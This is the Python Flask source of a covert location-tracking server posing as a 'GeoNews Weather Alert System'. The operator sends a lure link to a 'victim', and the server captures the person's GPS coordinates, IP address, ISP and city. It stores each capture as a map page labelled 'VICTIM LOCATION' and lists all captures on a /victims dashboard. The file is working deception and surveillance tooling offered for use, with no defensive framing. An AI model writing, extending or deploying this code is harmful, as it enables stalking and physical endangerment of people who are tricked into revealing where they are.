#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import datetime
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Directory to store location files
LOCATIONS_DIR = "victim_locations"

# Create directory if it doesn't exist
if not os.path.exists(LOCATIONS_DIR):
    os.makedirs(LOCATIONS_DIR)
    print(f"📁 Created directory: {LOCATIONS_DIR}")

# ============================================================
# ROUTE: Serve the HTML page
# ============================================================
@app.route('/')
def index():
    return send_file('templates/index.html')

# ============================================================
# ROUTE: Save location and create HTML file
# ============================================================
@app.route('/save-location', methods=['POST'])
def save_location():
    try:
        data = request.json
        print("📥 Received data:", data)
        
        # Extract data
        lat = data.get('lat')
        lon = data.get('lon')
        accuracy = data.get('accuracy', 50)
        city = data.get('city', 'Unknown')
        region = data.get('region', 'Unknown')
        country = data.get('country', 'Unknown')
        isp = data.get('isp', 'Unknown')
        timestamp = data.get('timestamp', datetime.datetime.now().isoformat())
        ip = data.get('ip', 'Unknown')
        
        # Generate unique filename
        safe_city = city.replace(' ', '_').replace('/', '_')
        safe_region = region.replace(' ', '_').replace('/', '_')
        filename = f"{safe_city}_{safe_region}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        filepath = os.path.join(LOCATIONS_DIR, filename)
        
        print(f"📝 Creating file: {filename}")
        
        # ============================================================
        # CREATE HTML FILE WITH MAP
        # ============================================================
        html_content = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📍 Victim Location - {city}, {region}</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"><\/script>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: Arial, sans-serif;
            background: #0a0a0a;
            padding: 20px;
            color: #00ff41;
        }}
        .container {{
            max-width: 700px;
            margin: 0 auto;
            background: #111;
            border-radius: 16px;
            padding: 25px;
            border: 1px solid #00ff41;
            box-shadow: 0 0 50px rgba(0, 255, 65, 0.05);
        }}
        h1 {{
            color: #00ff41;
            font-size: 22px;
            margin-bottom: 4px;
            text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
        }}
        .subtitle {{
            color: #666;
            font-size: 13px;
            margin-bottom: 15px;
            border-bottom: 1px solid #1a1a1a;
            padding-bottom: 10px;
        }}
        .victim-badge {{
            display: inline-block;
            background: #ff0044;
            color: white;
            padding: 4px 16px;
            border-radius: 30px;
            font-size: 11px;
            font-weight: 700;
            animation: blink 1s infinite;
        }}
        @keyframes blink {{
            0%, 100% {{ opacity: 1; }}
            50% {{ opacity: 0.3; }}
        }}
        #map {{
            height: 400px;
            border-radius: 12px;
            overflow: hidden;
            border: 2px solid #00ff41;
            margin: 15px 0;
        }}
        .info-box {{
            background: #0a0a0a;
            border-radius: 10px;
            padding: 15px;
            border: 1px solid #1a1a1a;
            margin-top: 10px;
        }}
        .info-box .row {{
            display: flex;
            justify-content: space-between;
            padding: 5px 0;
            font-size: 13px;
            border-bottom: 1px solid #0a0a0a;
        }}
        .info-box .row:last-child {{
            border-bottom: none;
        }}
        .info-box .label {{
            color: #666;
        }}
        .info-box .value {{
            color: #00ff41;
            font-weight: 600;
        }}
        .danger {{
            background: #1a0000;
            border: 1px solid #ff0044;
            border-radius: 10px;
            padding: 12px;
            margin-top: 15px;
            color: #ff0044;
            font-size: 13px;
            font-weight: 600;
            text-align: center;
        }}
        .footer {{
            text-align: center;
            font-size: 10px;
            color: #333;
            margin-top: 15px;
            border-top: 1px solid #1a1a1a;
            padding-top: 10px;
        }}
        .timestamp {{
            color: #444;
            font-size: 11px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>📍 VICTIM LOCATION</h1>
        <div class="subtitle">
            <span class="victim-badge">🔴 LIVE TRACKING</span>
            <span style="color:#666; margin-left:10px;">Captured: {timestamp}</span>
        </div>
        
        <div id="map"></div>
        
        <div class="info-box">
            <div class="row">
                <span class="label">📍 City</span>
                <span class="value">{city}, {region}</span>
            </div>
            <div class="row">
                <span class="label">🌍 Country</span>
                <span class="value">{country}</span>
            </div>
            <div class="row">
                <span class="label">📱 ISP</span>
                <span class="value">{isp}</span>
            </div>
            <div class="row">
                <span class="label">🎯 Accuracy</span>
                <span class="value">{int(accuracy)} meters</span>
            </div>
            <div class="row">
                <span class="label">🔢 Coordinates</span>
                <span class="value">{lat}, {lon}</span>
            </div>
            <div class="row">
                <span class="label">🔢 IP Address</span>
                <span class="value">{ip}</span>
            </div>
            <div class="row">
                <span class="label">🕐 Time</span>
                <span class="value">{timestamp}</span>
            </div>
        </div>
        
        <div class="danger">
            ⚠️ VICTIM CLICKED THE LINK AND ALLOWED LOCATION
        </div>
        
        <div class="footer">
            Generated by GeoNews Weather Alert System<br>
            <span class="timestamp">File created: {timestamp}</span>
        </div>
    </div>
    
    <script>
        var map = L.map('map').setView([{lat}, {lon}], 17);
        L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png', {{
            attribution: '© OpenStreetMap contributors',
            maxZoom: 19
        }}).addTo(map);
        
        var marker = L.marker([{lat}, {lon}], {{
            icon: L.icon({{
                iconUrl: 'https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-2x-red.png',
                shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-shadow.png',
                iconSize: [25, 41],
                iconAnchor: [12, 41],
                popupAnchor: [1, -34],
                shadowSize: [41, 41]
            }})
        }}).addTo(map);
        
        marker.bindPopup(`
            <b>🚨 VICTIM FOUND</b><br>
            📍 {city}, {region}<br>
            🎯 {int(accuracy)} meters accuracy
        `).openPopup();
        
        L.circle([{lat}, {lon}], {{
            color: '#ff0044',
            fillColor: '#ff0044',
            fillOpacity: 0.15,
            radius: {int(accuracy)}
        }}).addTo(map);
        
        setTimeout(() => {{
            map.setView([{lat}, {lon}], 18);
        }}, 1000);
    <\/script>
</body>
</html>'''
        
        # Save the file
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"✅ File created: {filepath}")
        print(f"📍 Victim: {city}, {region} ({lat}, {lon})")
        
        # Also save JSON data for easy access
        json_file = filepath.replace('.html', '.json')
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        print(f"✅ JSON saved: {json_file}")
        
        return jsonify({
            'success': True,
            'message': 'Location saved successfully',
            'file': filename,
            'city': city,
            'region': region
        }), 200
        
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

# ============================================================
# ROUTE: List all captured locations
# ============================================================
@app.route('/victims')
def list_victims():
    files = []
    if os.path.exists(LOCATIONS_DIR):
        for f in os.listdir(LOCATIONS_DIR):
            if f.endswith('.html'):
                files.append(f)
    
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>📊 Captured Locations</title>
        <style>
            body { font-family: Arial; background: #0a0a0a; color: #00ff41; padding: 30px; }
            h1 { color: #ff0044; }
            .victim { background: #111; padding: 12px 15px; margin: 8px 0; border-radius: 8px; border-left: 3px solid #ff0044; display: flex; justify-content: space-between; align-items: center; }
            .victim a { color: #00ff41; text-decoration: none; }
            .victim a:hover { text-decoration: underline; }
            .count { color: #666; font-size: 14px; }
            .badge { background: #ff0044; color: white; padding: 2px 10px; border-radius: 20px; font-size: 10px; }
        </style>
    </head>
    <body>
        <h1>📊 Captured Locations</h1>
        <p class="count">Total victims: ''' + str(len(files)) + '''</p>
        <hr style="border-color:#1a1a1a;">
    '''
    
    for f in sorted(files, reverse=True):
        html += f'''
        <div class="victim">
            <span>📍 <a href="/view/{f}">{f}</a></span>
            <span class="badge">View Map</span>
        </div>
        '''
    
    html += '''
    </body>
    </html>
    '''
    return html

# ============================================================
# ROUTE: View captured location file
# ============================================================
@app.route('/view/<filename>')
def view_location(filename):
    filepath = os.path.join(LOCATIONS_DIR, filename)
    if os.path.exists(filepath):
        return send_file(filepath)
    else:
        return "File not found", 404

# ============================================================
# MAIN
# ============================================================
if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║  🔴 GEO NEWS WEATHER TRACKER                             ║
    ║                                                           ║
    ║  📍 Victims saved in: victim_locations/                  ║
    ║                                                           ║
    ║  🌐 Server: http://localhost:5000                        ║
    ║  📊 View victims: http://localhost:5000/victims         ║
    ║                                                           ║
    ║  ⚠️ Send this link to victim:                            ║
    ║     http://YOUR_IP:5000/                                 ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=5000, debug=True)